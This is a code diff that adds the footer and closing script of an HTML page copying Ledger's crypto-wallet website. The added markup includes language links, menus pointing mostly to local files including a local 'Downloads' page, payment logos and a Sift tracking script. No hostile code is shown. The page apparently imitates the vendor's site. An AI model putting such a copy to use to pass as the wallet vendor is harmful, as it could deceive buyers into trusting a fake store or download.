+            <li><a href="#" title="Ledger Linkedin company"><i class="fab fa-linkedin"></i></a></li>
+            <li><a href="#" title="Ledger Tiktok"><i class="fab fa-tiktok"></i></a></li>-->
+          </ul>
+        </div>
+
+        
+
+      </div>
+    </div>
+  </div>
+
+<footer id="footer" class="footer   ">
+	<div class="row flexbox">
+    <div>
+      <a href="index.html" title="Ledger" class="logo"
+        ><img
+          src="images/ledger-logo-long.svg"
+          alt="Ledger"
+      /></a>
+      <ul class="language-container">
+        <li class="has-children language-switcher">
+          <a href="#" title="ENGLISH">ENGLISH</a>
+          <ul class="submenu">
+            <li>
+              <a
+                class="localeItem"
+                lang="ar"
+                href="ar/"
+                title="العربية"
+                >العربية</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="de"
+                href="de/"
+                title="DEUTSCH"
+                >DEUTSCH</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="es"
+                href="es/"
+                title="ESPAÑOL"
+                >ESPAÑOL</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="fr"
+                href="fr/"
+                title="FRANÇAIS"
+                >FRANÇAIS</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ja"
+                href="ja/"
+                title="日本語"
+                >日本語</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ko"
+                href="ko/"
+                title="한국어"
+                >한국어</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="pt-BR"
+                href="pt-BR/"
+                title="PORTUGUÊS (BRASIL)"
+                >PORTUGUÊS</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="ru"
+                href="ru/"
+                title="РУССКИЙ"
+                >РУССКИЙ</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="tr"
+                href="tr/"
+                title="TÜRKÇE"
+                >TÜRKÇE</a
+              >
+            </li>
+
+            <li>
+              <a
+                class="localeItem"
+                lang="zh-CN"
+                href="zh-CN/"
+                title="简体中文"
+                >简体中文</a
+              >
+            </li>
+          </ul>
+        </li>
+      </ul>
+      <div class="caption">
+        <p>
+          Copyright © Ledger SAS. All rights reserved. Ledger, Ledger
+          Stax, Ledger Nano S, Ledger Vault, Bolos are registered
+          trademarks of Ledger SAS<br /><br />
+          1 rue du mail, 75002, Paris, France<br /><br />
+          Payment methods
+        </p>
+        <img src="images/logo-paypal-s.png" alt="">&nbsp;
+        <img src="images/logo-crypto-s.png" alt="">&nbsp;
+        <img src="images/logo-bitpay-s.png" alt="">&nbsp;
+        <br>
+        <img src="images/layer1.png" alt="">&nbsp;
+        <img src="images/logo-visa-s.png" alt="">&nbsp;
+        <img src="images/logo-maestro-s.png" alt="">&nbsp;
+        <img src="images/logo-mastercard-s.png" alt="">&nbsp;
+        <img src="images/logo-cb-s.png" alt="">
+      </div>
+    </div>
+		
+		
+	
+		
+    <nav class="flexbox footer-navigation">
+      <div>
+        <ul>
+          <li>Products<ul id="menu-footer-1-products" class="menu">
+              <!-- <li id="menu-item-255315"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-255315"><a
+                  href="ledger-stax.html">Ledger Stax</a></li> -->
+              <li id="menu-item-4481" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4481">
+                <a href="ledger-nano-x.html">Ledger Nano X</a>
+              </li>
+              <li id="menu-item-91454"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-91454"><a
+                  href="ledger-nano-s-plus.html">Ledger Nano S Plus</a></li>
+              <li id="menu-item-11736"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11736"><a
+                  href="hardware-wallets-comparison.html">Compare our devices</a></li>
+              <!-- <li id="menu-item-12666"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12666"><a
+                  href="shop.html#category-bundle">Bundles</a></li>
+              <li id="menu-item-4484" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4484">
+                <a href="shop.html#category-accessories">Accessories</a>
+              </li> -->
+              <!-- <li id="menu-item-4483" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4483">
+                <a href="shop.html">All products</a>
+              </li> -->
+              <li id="menu-item-4485" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4485">
+                <a href="ledger-live.html">Downloads</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>Crypto Assets<ul id="menu-footer-6-crypto-assets" class="menu">
+              <li id="menu-item-9935" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9935">
+                <a href="https://www.ledger.com/bitcoin-wallet/">Bitcoin</a>
+              </li>
+              <li id="menu-item-4497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4497">
+                <a href="https://www.ledger.com/ripple-wallet/">XRP</a>
+              </li>
+              <li id="menu-item-4498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4498">
+                <a href="https://www.ledger.com/ethereum-wallet/">Ethereum</a>
+              </li>
+              <li id="menu-item-4499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4499">
+                <a href="https://www.ledger.com/bitcoin-cash-wallet/">Bitcoin Cash</a>
+              </li>
+              <li id="menu-item-9017" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9017">
+                <a href="https://www.ledger.com/eos-wallet/">Eos</a>
+              </li>
+              <li id="menu-item-9936" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9936">
+                <a href="https://www.ledger.com/stellar-wallet/">Stellar</a>
+              </li>
+              <li id="menu-item-4496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4496">
+                <a href="supported-crypto-assets.html">See all assets</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+      <div>
+        <ul>
+          <li>For Business<ul id="menu-footer-2-for-business" class="menu">
+              <li id="menu-item-4490" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490">
+                <a href="https://enterprise.ledger.com/">Ledger Enterprise Solutions</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-a">
+                <a href="https://www.ledger.com/reseller">Official Resellers</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-b">
+                <a href="https://www.ledger.com/partners">Partners</a>
+              </li>
+              <li id="menu-item-4490"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4490-a">
+                <a href="https://www.ledger.com/co-branded-partnership">Co-branded Partnerships</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+        <!-- <ul>
+          <li>For Developers<ul id="menu-footer-8-for-developers" class="menu">
+              <li id="menu-item-79929"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-79929"><a
+                  href="developers.html">The Developer Portal</a></li>
+            </ul>
+          </li>
+        </ul> -->
+        <ul>
+          <li>Get started<ul id="menu-footer-3-get-started" class="menu">
+              <li id="menu-item-10242"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-10242"><a
+                  href="https://www.ledger.com/start">Start using your Ledger device</a></li>
+              <li id="menu-item-11525"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11525"><a
+                  href="https://www.ledger.com/ledger-wallets-and-services">Compatible wallets and services</a></li>
+              <li id="menu-item-11520"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11520"><a
+                  href="buy-bitcoin.html">How to buy Bitcoin</a></li>
+              <li id="menu-item-15515"
+                class="menu-item menu-item-type-post_type menu-item-object-post menu-item-15515"><a
+                  href="https://www.ledger.com/buy-bitcoin/how">Guide before buying bitcoin</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>See also<ul id="menu-footer-4-see-also" class="menu">
+              <li id="menu-item-4505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4505">
+                <a href="support.html">Support</a>
+              </li>
+              <li id="menu-item-4507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4507">
+                <a href="https://donjon.ledger.com/bounty/">Bounty program</a>
+              </li>
+              <!-- <li id="menu-item-9937" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9937">
+                <a href="reseller.html">Resellers</a></li> -->
+              <li id="menu-item-79931"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79931"><a
+                  href="https://www.ledger.com/press">Ledger Press Kit</a></li>
+              <li id="menu-item-9938" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9938">
+                <a href="https://affiliate.ledger.com/">Affiliates</a>
+              </li>
+              <li id="menu-item-9939" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-9939">
+                <a href="https://status.ledger.com/">Status</a>
+              </li>
+              <li id="menu-item-14258"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-14258"><a
+                  href="https://www.ledger.com/partners">Partners</a></li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+      <div>
+        <ul>
+          <li>Careers<ul id="menu-footer-9-careers" class="menu">
+              <li id="menu-item-211290"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-211290"><a
+                  href="https://www.ledger.com/career">Join us</a></li>
+              <li id="menu-item-79930"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79930"><a
+                  href="https://www.ledger.com/jobs">All jobs</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>About<ul id="menu-footer-5-about" class="menu">
+              <li id="menu-item-12382"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12382"><a
+                  href="https://www.ledger.com/blog/we-are-ledger-a-brand-vision">Our vision</a></li>
+              <li id="menu-item-11491"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11491"><a
+                  href="https://www.ledger.com/academy">Ledger Academy</a></li>
+              <li id="menu-item-4501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4501">
+                <a href="https://www.ledger.com/the-company">The company</a>
+              </li>
+              <li id="menu-item-4502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4502">
+                <a href="https://www.ledger.com/the-people-behind-ledger">The people</a>
+              </li>
+              <li id="menu-item-13241"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-13241"><a
+                  href="https://www.ledger.com/diversity">Diversity</a></li>
+              <li id="menu-item-79928"
+                class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79928"><a
+                  href="https://www.ledger.com/in-the-news">In the news</a></li>
+              <li id="menu-item-10246"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-10246"><a href="blogs.html">Our
+                  blogs</a></li>
+            </ul>
+          </li>
+        </ul>
+        <ul>
+          <li>Legal<ul id="menu-footer-7-legal" class="menu">
+              <li id="menu-item-4509" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4509">
+                <a href="terms-and-conditions.html">Sales Terms and Conditions</a>
+              </li>
+              <li id="menu-item-4510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4510">
+                <a href="website-terms-of-use.html">Website Terms of Use</a>
+              </li>
+              <li id="menu-item-12908"
+                class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12908"><a
+                  href="ledger-live-terms-of-use.html">Ledger Live Terms of Use</a></li>
+              <li id="menu-item-4511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4511">
+                <a href="https://www.ledger.com/privacy-policy">Privacy Policy</a>
+              </li>
+              <li id="menu-item-4512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4512">
+                <a href="cookie-policy.html">Cookie Policy</a>
+              </li>
+              <li id="menu-item-4513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4513">
+                <a href="other.html">Other</a>
+              </li>
+            </ul>
+          </li>
+        </ul>
+
+      </div>
+    </nav>
+		    
+	</div>
+</footer>
+
+
+</div>
+  <script>
+    var devSift = '116107f359';
+    var prodSift = 'a2301bbaac';
+    var siftKey = window.theme.shop.domain === 'ledgerstore-dev.myshopify.com' ? devSift : prodSift;
+    var _sift = window._sift = window._sift || [];
+
+    _sift.push(['_setAccount', siftKey]);
+    _sift.push(['_trackPageview']);
+
+    var _user_id ='' ;
+    
+    _sift.push(['_setUserId', _user_id]);
+
+    (function() {
+    function ls() {
+    var e = document.createElement('script');
+    e.src = 'https://cdn.siftscience.com/s.js';
+    document.body.appendChild(e);
+    }
+    if (window.attachEvent) {
+    window.attachEvent('onload', ls);
+    } else {
+    window.addEventListener('load', ls, false);
+    }
+    })();
+</script>
+</body>
+
+</html>
